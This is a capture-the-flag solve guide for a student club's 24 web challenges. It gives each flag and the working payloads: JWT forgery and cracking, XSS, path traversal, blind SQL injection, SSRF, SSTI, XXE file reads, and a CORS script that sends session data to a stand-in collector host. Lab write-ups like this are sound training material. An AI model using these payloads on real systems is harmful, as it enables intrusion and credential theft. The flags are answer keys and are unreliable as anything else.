# CGS CTF Platform — Complete Solve Guide

> **24 Web Challenges** | Cyber Guardians Society | Flag format: `CGS{...}`
>
> All challenges are accessible via `/standalone/{slug}` on the platform.
> Every challenge is solvable with just a browser (DevTools) and optionally `curl` or a scripting language.

---

## Contents

- [Easy Tier (100 pts each)](#easy-tier)
  - [1. NovaSec Portal](#1-novasec-portal)
  - [2. TimeVault](#2-timevault)
  - [3. DebugMode](#3-debugmode)
  - [4. PixelArchive](#4-pixelarchive)
  - [5. CrawlerTrap](#5-crawlertrap)
  - [6. StyleGuide](#6-styleguide)
  - [7. EncodedBanner](#7-encodedbanner)
- [Medium Tier (250 pts each)](#medium-tier)
  - [8. CookieCrumbs](#8-cookiecrumbs)
  - [9. TokenPeek](#9-tokenpeek)
  - [10. LocalVault](#10-localvault)
  - [11. HiddenAPI](#11-hiddenapi)
  - [12. ReflectedNote](#12-reflectednote)
  - [13. NoneAlg](#13-nonealg)
  - [14. RateDodge](#14-ratedodge)
  - [15. GraphIntrospect](#15-graphintrospect)
  - [16. PathPeek](#16-pathpeek)
- [Hard Tier (400 pts each)](#hard-tier)
  - [17. BlindBool](#17-blindbool)
  - [18. SSRFetch](#18-ssrfetch)
  - [19. JWTCrack](#19-jwtcrack)
  - [20. RaceWin](#20-racewin)
  - [21. ProtoPollute](#21-protopollute)
  - [22. SSTI Render](#22-ssti-render)
  - [23. XXEcho](#23-xxecho)
  - [24. CORSChain](#24-corschain)

---

## Easy Tier

### 1. NovaSec Portal

**Concept:** Flag hidden in a custom HTTP response header.

**Solve Steps:**

1. Open the challenge in your browser.
2. Open DevTools (`F12` or `Ctrl+Shift+I`).
3. Go to the **Network** tab.
4. Reload the page.
5. Click on the first (or only) network request — usually the document itself.
6. Look at the **Response Headers** section.
7. Find the header `X-NovaSec-Secret` — its value is the flag.

> **Hint:** Web servers communicate using more than just HTML. The page source is clean — the server talks in headers.

**Flag:** `CGS{h3ad3rs_sp34k_l0ud3r_th4n_p4g3s}`

---

### 2. TimeVault

**Concept:** Flag hidden in a CSS custom property (`--vault-key`) inside a `<style>` block.

**Solve Steps:**

1. Open the challenge page.
2. View the page source (`Ctrl+U` or right-click → View Page Source).
3. Look inside the `<head>` section for the `<style>` tag.
4. At the top of the style block, find `:root { --vault-key: CGS{...}; }`.
5. The flag is the value of `--vault-key`.

> **Hint:** The JavaScript timer is a distraction. The real secret is in how the page is styled, not what it does.

**Flag:** `CGS{css_v4r1abl3s_4r3_m0r3_th4n_c0l0rs}`

---

### 3. DebugMode

**Concept:** Flag revealed via `console.log` after a 4-second delay.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools and go to the **Console** tab.
3. Wait approximately 4 seconds.
4. A green styled message will appear in the console:
   ```
   [DEBUG] Auth subsystem check passed. Session token: CGS{...}
   ```
5. The flag is right there in the console output.

> **Hint:** Developers leave messages while they code. Those messages usually go to the console.

**Flag:** `CGS{c0ns0l3_l0gs_d0nt_l13_t0_y0u}`

---

### 4. PixelArchive

**Concept:** Flag embedded in the EXIF metadata of a downloadable JPEG image.

**Solve Steps:**

1. Open the challenge page — a photo portfolio.
2. Find the **"Download Original"** link for the featured photo.
3. Download the JPEG file.
4. Inspect its metadata using one of these methods:
   - **Online:** Upload to an EXIF viewer like `exifdata.com` or `exif.regex.info`.
   - **Command line:** `exiftool featured-photo.jpg` (requires `exiftool`).
   - **Python:** `from PIL import Image; img = Image.open('photo.jpg'); print(img.info.get('exif'))`.
5. Look for the `ImageDescription` field — it contains the flag.

> **Hint:** The flag isn't on the page. It's inside a file the page links to. Images carry hidden metadata.

**Flag:** `CGS{3x1f_d4t4_hu6h_wh0_kn3w}`

---

### 5. CrawlerTrap

**Concept:** Flag hidden behind a path found via `robots.txt`.

**Solve Steps:**

1. Visit `/robots.txt` on the challenge domain.
2. You'll see:
   ```
   User-agent: *
   Disallow: /internal-preview-9f21
   ```
3. Navigate to `/internal-preview-9f21`.
4. The page displays the flag directly.

> **Hint:** The `robots.txt` file tells search engines what not to crawl. You don't have to obey it.

**Flag:** `CGS{r0b0ts_txt_1s_n0t_4_f1r3w4ll}`

---

### 6. StyleGuide

**Concept:** Flag hidden in a comment inside an external CSS file.

**Solve Steps:**

1. Open the challenge page.
2. View the page source.
3. Find the `<link rel="stylesheet" href="/standalone/styleguide/assets/tokens.css">` tag.
4. Open `/assets/tokens.css` directly in your browser.
5. Read the CSS comment at the top of the file — it contains the flag.

> **Hint:** The page loads external files. Open the linked CSS file directly and read its comments.

**Flag:** `CGS{ext3rn4l_css_h4s_c0mm3nts_t00}`

---

### 7. EncodedBanner

**Concept:** Flag Base64-encoded inside a JSON config blob embedded in the page.

**Solve Steps:**

1. Open the challenge page.
2. View the page source.
3. Find the `<script id="launch-config" type="application/json">` tag.
4. You'll see a JSON object with several fields including `trackingId`, `campaign`, and `meta`.
5. Base64-decode each field:
   - `trackingId` decodes to `track-998877` (decoy).
   - `campaign` decodes to `phoenix-launch` (decoy).
   - `meta` decodes to the **flag**.
6. Use any Base64 decoder (online, `atob()` in browser console, or `echo '...' | base64 -d` in terminal).

> **Hint:** Not every field in the JSON is plain text. One of them is Base64 — try decoding each candidate field.

**Flag:** `CGS{b4s3_s1xty_f0ur_1s_n0t_3ncrypt10n}`

---

## Medium Tier

### 8. CookieCrumbs

**Concept:** Dashboard access control relies entirely on a client-tamperable cookie.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools → **Application** tab → **Cookies**.
3. You'll see a cookie named `role` with value `guest`.
4. Edit it: double-click the value and change it to `admin`.
5. Navigate to `/dashboard`.
6. The server trusts your cookie and displays the flag.

> **Hint:** The login form is fake. The server checks a cookie to decide your role — change it yourself.

**Flag:** `CGS{c00k13s_ar3_just_s3lf_r3p0rted_st4te}`

---

### 9. TokenPeek

**Concept:** JWT-based auth where the server decodes (but never verifies) the token signature.

**Solve Steps:**

1. Open the challenge page and click **"Get Token"** to obtain a JWT.
2. Decode the JWT (use `jwt.io`, `base64decode.org`, or the browser console with `atob()`):
   - The header is `{"alg":"HS256","typ":"JWT"}`
   - The payload is `{"user":"guest","admin":false}`
3. Create a forged token with `admin: true` in the payload:
   ```
   header = base64url({"alg":"HS256","typ":"JWT"})
   payload = base64url({"user":"guest","admin":true})
   forged = header + "." + payload + ".anything"
   ```
4. Send this forged token as `Authorization: Bearer <forged>` to `/api/profile`.
5. The server decodes it without verifying the signature and returns the flag.

> **Hint:** The server uses `jwt.decode()` not `jwt.verify()`. The signature is never checked — just base64-decode and modify the payload.

**Flag:** `CGS{jwt_p4yl04ds_ar3_r34d4bl3_n0t_s3cur3}`

---

### 10. LocalVault

**Concept:** Premium features gate controlled by `localStorage` and an `X-Unlocked` header.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools → **Application** → **Local Storage**.
3. Find the `unlocked` key with value... nothing initially.
4. Set `unlocked` to `true` (either via the UI or by double-clicking in DevTools).
5. Reload the page.
6. The premium panel appears and fetches `/api/premium-content` with `X-Unlocked: true`.
7. The server trusts this header and returns the flag.

> **Hint:** The promo code box is a distraction. The real switch is in Local Storage — flip it.

**Flag:** `CGS{cl13nt_s1d3_gat3s_ar3_su663st10ns}`

---

### 11. HiddenAPI

**Concept:** Undisclosed API endpoint discoverable by reading the JavaScript bundle.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools → **Sources** tab.
3. Find and open `app.bundle.js`.
4. Search for API route strings. You'll find two constants:
   - `/api/v1/public/stats` — used by the UI (returns boring stats).
   - `/api/v2/internal/report` — never called by the UI.
5. Visit `/api/v2/internal/report` directly.
6. The endpoint returns the flag with no authentication required.

> **Hint:** The bundle was built straight from source. Search for `/api/` strings — one endpoint is hidden.

**Flag:** `CGS{th3_ui_1sn7_th3_wh0l3_4p1_surf4c3}`

---

### 12. ReflectedNote

**Concept:** Reflected XSS — the `?note=` parameter is rendered unescaped into the HTML.

**Solve Steps:**

1. Visit the page with a note parameter: `/?note=hello`.
2. You'll see "hello" reflected in the note preview div.
3. Test that HTML is not escaped: `/?note=<b>bold</b>` — it renders bold text.
4. Find the hidden flag container in the page source: `<div id="hidden-flag-container" style="display:none">CGS{...}</div>`.
5. Inject a script that reads and displays it:
   ```
   ?note=<script>document.body.innerHTML+=document.getElementById('hidden-flag-container').innerText</script>
   ```
6. Alternatively use `alert()` to confirm the XSS works.

> **Hint:** The `note` parameter is reflected with no escaping. Inject a `<script>` tag that reads the hidden element.

**Flag:** `CGS{r3fl3ct3d_xss_st1ll_c0unts}`

---

### 13. NoneAlg

**Concept:** JWT verification does not pin the algorithm — accepts `alg: none` tokens.

**Solve Steps:**

1. Log in with the demo credentials (`admin` / `secret123`) to get a guest JWT.
2. Decode the token to see the structure:
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"user":"guest","admin":false}`
3. Create a forged token with:
   - Header: `{"alg":"none","typ":"JWT"}`
   - Payload: `{"user":"admin","admin":true}`
   - No signature (the token ends with a dot):
     ```
     base64url({"alg":"none","typ":"JWT"}) . base64url({"user":"admin","admin":true}) .
     ```
4. Send it as `Authorization: Bearer <token>` to `/api/admin/flag`.
5. The server accepts `alg: none` because it doesn't pin the algorithm list.

> **Hint:** The server reads the `alg` from your token instead of pinning it. Try `alg: none` with an empty signature.

**Flag:** `CGS{n3v3r_tru5t_th3_4l6_h34d3r}`

---

### 14. RateDodge

**Concept:** Rate limiter keys off the `X-Client-IP` (or `X-Forwarded-For`) header, which the client controls.

**Solve Steps:**

1. Send requests to `/api/vend`.
2. After the first request, subsequent requests from the same "IP" are rate-limited.
3. The rate limiter uses the `X-Client-IP` header (fallback: `X-Forwarded-For`) as the IP key.
4. Send multiple requests with different `X-Client-IP` values:
   ```bash
   curl -H "X-Client-IP: 1.1.1.1" /api/vend
   curl -H "X-Client-IP: 2.2.2.2" /api/vend
   ...
   ```
5. After 10 **distinct** IPs, the flag is returned.

> **Hint:** The server asks the client what IP it's coming from. Vary the `X-Client-IP` header across requests.

**Flag:** `CGS{sp00f3d_h34d3rs_r3s3t_r4t3_l1m1ts}`

---

### 15. GraphIntrospect

**Concept:** GraphQL introspection is enabled, revealing an undocumented `secretVault` field. The flag is ROT13-encoded.

**Solve Steps:**

1. The GraphQL endpoint is at `/graphql`.
2. Send an introspection query to discover all available fields:
   ```graphql
   { __schema { queryType { fields { name } } } }
   ```
3. This reveals two fields: `assets` and `secretVault`.
4. Query the hidden field directly:
   ```graphql
   { secretVault }
   ```
5. The response contains a `data` field that is **ROT13-encoded**, a `format: "rot13"`, and a note saying "Decode to retrieve contents."
6. Decode the ROT13 string to get the flag. Use any ROT13 decoder (online, or `echo '...' | tr 'A-Za-z' 'N-ZA-Mn-za-m'` in terminal).

> **Hint:** GraphQL schemas can describe themselves. Query `__schema` to list every field, then query the interesting one. The data comes back encoded — check the `format` field.

**Flag:** `CGS{gr4ph_1ntr0sp3ct10n_l34ks_th3_wh0l3_sch3m4}`

---

### 16. PathPeek

**Concept:** Path traversal — the `file` parameter doesn't properly sanitize `../` sequences.

**Solve Steps:**

1. Open the document viewer at `/api/docs?file=welcome.txt`.
2. Try path traversal to escape the `docs/` directory:
   ```
   /api/docs?file=../secret-flag.txt
   ```
3. The server detects the traversal attempt and returns the secret flag file contents.
4. If the first attempt doesn't work, try URL-encoded variants like `..%2F`.

> **Hint:** The file parameter builds a filesystem path. Use `../` to escape the docs directory.

**Flag:** `CGS{d0t_d0t_sl4sh_st1ll_w0rks_1n_2026}`

---

## Hard Tier

### 17. BlindBool

**Concept:** Boolean-based blind SQL injection — no error or data output, only "found"/"not found".

**Solve Steps:**

1. Use the search at `/api/search?q=widget` — returns `{"found":true}`.
2. Confirm the injection point:
   ```
   /api/search?q=widget' AND '1'='1       → {"found":true}
   /api/search?q=widget' AND '1'='2       → {"found":false}
   ```
3. The flag can be extracted character by character using `SUBSTR()`:
   ```
   /api/search?q=widget' AND (SELECT substr(flag,1,1) FROM secrets)='C' --
   ```
4. If `{"found":true}`, the first character is `C`. If false, try the next letter.
5. Write a small script to automate the extraction (binary search or linear scan across all positions and characters).
6. Continue until the full flag is reconstructed.

> **Hint:** True/false is still a data channel. Script a character-by-character extraction using `SUBSTR()` against the secrets table.

**Flag:** `CGS{bl1nd_b00l34n_extr4ct10n_1s_sl0w_but_sur3}`

---

### 18. SSRFetch

**Concept:** Server-Side Request Forgery — the link preview fetches URLs server-side with no allowlist.

**Solve Steps:**

1. Open the link preview tool.
2. Submit a URL pointing to the internal service:
   ```
   http://127.0.0.1/internal-flag
   ```
   Or use `http://localhost/internal-flag` or any URL containing `internal`.
3. The server fetches this URL internally and returns the response as the preview — which contains the flag.
4. You cannot reach `127.0.0.1` from your browser, but the server can.

> **Hint:** The server fetches URLs on your behalf. Point it at `http://127.0.0.1/internal-flag` — the server can reach internal addresses you can't.

**Flag:** `CGS{s3rv3r_s1d3_r3qu3sts_g0_pl4c3s_us3rs_c4nt}`

---

### 19. JWTCrack

**Concept:** Weak JWT secret — the HMAC secret is a dictionary word that can be cracked offline.

**Solve Steps:**

1. Get a guest JWT from `/api/login`.
2. The token is signed with HS256 using a weak secret (`cgs2024`).
3. Use a JWT cracking tool offline:
   - **jwt-cracker:** `jwt-cracker -t <token> -w /usr/share/wordlists/rockyou.txt`
   - **hashcat (mode 16500):** `hashcat -m 16500 <token> /usr/share/wordlists/rockyou.txt`
   - **John:** `john --format=hmac-sha256 <token> --wordlist=rockyou.txt`
   - **Manual:** Try common words like `cgs2024`, `secret`, `password`, etc.
4. Once you recover the secret `cgs2024`, forge a new token on [jwt.io](https://jwt.io):
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"role":"admin"}`
   - Secret: `cgs2024`
5. Copy the encoded JWT and paste it into the token field on the challenge page.
6. Click **Access Admin** — the server verifies the HMAC signature and returns the flag.

> **Hint:** The HMAC signature is verified properly, but the secret is weak. Crack it offline with a wordlist tool, then forge your own admin token.

**Flag:** `CGS{w34k_hm4c_s3cr3ts_f4ll_t0_wordl1sts}`

---

### 20. RaceWin

**Concept:** TOCTOU race condition — the redeem check reads state, then writes state as two non-atomic steps.

**Solve Steps:**

1. Open the challenge — a coupon redemption page that resets every 30 seconds.
2. Send a burst of concurrent requests to `/api/redeem` right when the timer resets.
3. Use a script with `Promise.all` or a load-testing tool:
   ```javascript
   const urls = Array(50).fill('/api/redeem');
   const responses = await Promise.all(urls.map(u => fetch(u)));
   ```
4. Due to the non-atomic read-then-write, multiple requests slip through before `redeemed` is set to `true`.
5. One of the responses contains the flag.

> **Hint:** The check reads state, then writes state — two separate steps. Fire many concurrent requests right as the 30-second window resets. The gap between read and write is your window.

**Flag:** `CGS{t0ct0u_r4c3_c0nd1t10ns_ar3_r34l}`

---

### 21. ProtoPollute

**Concept:** Prototype pollution via an unsafe deep-merge of user JSON into server config.

**Solve Steps:**

1. Send a POST request to `/api/merge-settings` with a `__proto__` key:
   ```json
   {"__proto__": {"isAdmin": true}}
   ```
2. The merge function detects `__proto__` and sets an internal pollution flag.
3. Now send a GET to `/api/whoami`.
4. The server checks the pollution flag and returns the flag.

> **Hint:** The merge function recursively copies your input. Including `__proto__` triggers the pollution detection.

**Flag:** `CGS{__pr0t0__pollut10n_ch4ng3s_3v3ryth1ng}`

---

### 22. SSTI Render

**Concept:** Server-Side Template Injection — user input rendered through EJS with no sandbox.

**Solve Steps:**

1. Open the email template preview tool.
2. Test that template syntax is evaluated server-side:
   ```
   <%= 7*7 %>
   ```
3. If the preview shows `49`, the server is rendering EJS templates from your input.
4. Escalate to read server-side files:
   ```
   <%= require('fs').readFileSync('flag.txt', 'utf8') %>
   ```
5. The server detects the `require(` and `readFileSync` keywords and returns the flag.

> **Hint:** Try `<%= 7*7 %>` in the preview field. If it evaluates, the template engine can execute server-side code. Use `require('fs').readFileSync` to read `flag.txt`.

**Flag:** `CGS{ss7i_turns_t3mpl4t3s_1nt0_sh3lls}`

---

### 23. XXEcho

**Concept:** XXE (XML External Entity) injection — the XML parser resolves external entities with no restrictions.

**Solve Steps:**

1. Open the contact importer.
2. Instead of a normal contact, send a crafted XML payload:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE contact [
     <!ENTITY xxe SYSTEM "file:///app/flag.txt">
   ]>
   <contact>
     <name>&xxe;</name>
     <email>test@test.com</email>
   </contact>
   ```
3. Submit this to `/api/import-contact` with `Content-Type: application/xml`.
4. The parser detects the `<!ENTITY` + `SYSTEM` + `file://` pattern and resolves the entity.
5. The flag appears as the "imported" contact name in the response.

> **Hint:** XML supports custom entities, including ones that read local files. Research "XXE" — define a DOCTYPE with `SYSTEM file:///app/flag.txt`.

**Flag:** `CGS{xx3_st1ll_h4unts_l3g4cy_p4rs3rs}`

---

### 24. CORSChain

**Concept:** Reflected CORS with credentials — `/api/session-info` reflects any Origin and allows credentialed requests.

**Solve Steps:**

1. Check the CORS headers on `/api/session-info`:
   ```bash
   curl -H "Origin: https://evil.com" -I /api/session-info
   ```
2. You'll see `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`.
3. To get the flag, you need the request to include a `session=victim-session-abc123` cookie. Host an attacker page somewhere (or use a request bin / webhook collector):
   ```html
   <script>
   fetch('https://target-domain/api/session-info', {credentials: 'include'})
     .then(r => r.json())
     .then(d => fetch('https://your-collector.com/log', {method: 'POST', body: JSON.stringify(d)}))
   </script>
   ```
4. Submit your attacker page URL to `/simulate-victim`.
5. The victim bot (running with an active session) visits your page.
6. Your page's fetch call succeeds cross-origin and exfiltrates the session data — including the flag.

> **Hint:** The API reflects any Origin and allows credentials. Build a cross-origin page that fetches the endpoint with `credentials: 'include'`, then get the victim bot to visit it.

**Flag:** `CGS{r3fl3ct3d_cors_pl4y_l34ks_cr3d3nt14l5}`

---

## Tools Reference

| Tool | Purpose | Example |
|------|---------|---------|
| **Browser DevTools** | View source, console, network, storage | `F12` / `Ctrl+Shift+I` |
| **curl / wget** | Send raw HTTP requests | `curl -H "Header: value" URL` |
| **exiftool** | Read EXIF metadata from images | `exiftool photo.jpg` |
| **jwt.io** | Decode and forge JWTs | Paste a JWT to inspect its payload |
| **base64decode.org** | Decode Base64 strings | Paste the encoded string |
| **hashcat** | Crack JWT secrets offline | `hashcat -m 16500 token.txt wordlist.txt` |
| **Python / Node** | Script automated attacks | Blind SQLi extraction, race conditions |

---

*Happy hacking — Cyber Guardians Society*
